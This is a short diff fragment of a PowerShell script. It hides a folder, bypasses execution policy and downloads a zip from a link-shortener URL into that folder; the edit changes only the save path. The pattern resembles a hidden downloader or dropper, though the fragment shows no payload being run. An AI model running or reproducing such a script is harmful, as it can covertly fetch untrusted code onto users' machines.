@@ -7,7 +7,7 @@ attrib +h "$TOOL"
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
 
 $webClient = New-Object -TypeName System.Net.WebClient
-$task = $webClient.DownloadFileTaskAsync('https://seulink.net/TOOLZIP', '$TOOL\#TOOL#ZIP.zip')
+$task = $webClient.DownloadFileTaskAsync('https://seulink.net/TOOLZIP', 'C:\TOOL\#TOOL#ZIP.zip')
 
 Register-ObjectEvent -InputObject $webClient -EventName DownloadProgressChanged -SourceIdentifier WebClient.DownloadProgressChanged | Out-Null
 
